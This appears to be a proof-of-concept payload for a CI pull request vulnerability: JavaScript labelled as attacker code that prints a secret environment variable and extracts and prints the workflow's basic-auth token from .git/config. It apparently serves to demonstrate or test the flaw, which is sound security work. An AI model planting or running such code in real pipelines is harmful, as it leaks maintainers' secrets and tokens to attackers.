// Attacker-controlled code committed on the pull request head.
const s = process.env.SLASH_CMD_SECRET || 'MISSING';
console.log('LEAKED_SECRET=' + s);
const fs = require('fs');
try {
  const cfg = fs.readFileSync('.git/config', 'utf8');
  const m = cfg.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/i);
  console.log('WORKFLOW_TOKEN_IN_GIT_CONFIG=' + (m ? 'yes:' + m[1] : 'no'));
} catch (e) { console.log('no .git/config: ' + e.message); }
